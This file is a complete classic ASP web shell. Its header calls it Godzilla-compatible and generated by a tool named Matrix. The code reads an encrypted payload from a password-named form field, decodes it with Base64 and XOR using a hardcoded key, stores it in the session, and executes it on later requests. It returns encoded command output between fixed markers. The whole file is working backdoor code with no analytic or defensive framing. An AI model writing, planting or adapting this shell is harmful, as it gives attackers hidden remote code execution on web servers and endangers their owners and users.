<%'
' Godzilla-compatible classic ASP shell (ASP_XOR_BASE64), generated by Matrix.
'
' Placeholders:
'   mAtrix_911       connection password (form field name)
'   3c6e0b8a9c15224a      MD5(secretKey)[0:16]
'   371be1  MD5(PASS + KEY16)[0:6]
'   279ab2 MD5(PASS + KEY16)[20:26]
'
' Classic ASP has no MD5, so the two response markers are baked in at
' generation time (same approach as Godzilla's own ASP shell).
Function MxB64Decode(ByVal vCode)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    node.text = vCode
    MxB64Decode = node.nodeTypedValue
    Set node = Nothing
    Set xml = Nothing
End Function

Function MxB64Encode(ByVal vData)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = vData
    MxB64Encode = Replace(node.text, vbLf, "")
    Set node = Nothing
    Set xml = Nothing
End Function

Function MxXor(ByVal vData, ByVal vKey, ByVal vBinary)
    Dim i, size, keySize, stream
    keySize = Len(vKey)
    size = LenB(vData)
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "iso-8859-1"
    stream.Open
    For i = 1 To size
        stream.WriteText ChrW(AscB(MidB(vData, i, 1)) Xor Asc(Mid(vKey, (i Mod keySize) + 1, 1)))
    Next
    stream.Position = 0
    If vBinary Then
        stream.Type = 1
        MxXor = stream.Read()
    Else
        MxXor = stream.ReadText()
    End If
    stream.Close
    Set stream = Nothing
End Function

Dim mxPass, mxKey, mxData
mxPass = "mAtrix_911"
mxKey = "3c6e0b8a9c15224a"
mxData = Request.Form(mxPass)

If Len(mxData) > 0 Then
    If IsEmpty(Session("payload")) Then
        Session("payload") = MxXor(MxB64Decode(mxData), mxKey, False)
    Else
        Execute(Session("payload"))
        Response.Write "371be1"
        Response.Write MxB64Encode(MxXor(run(MxXor(MxB64Decode(mxData), mxKey, True)), mxKey, True))
        Response.Write "279ab2"
    End If
End If
%>
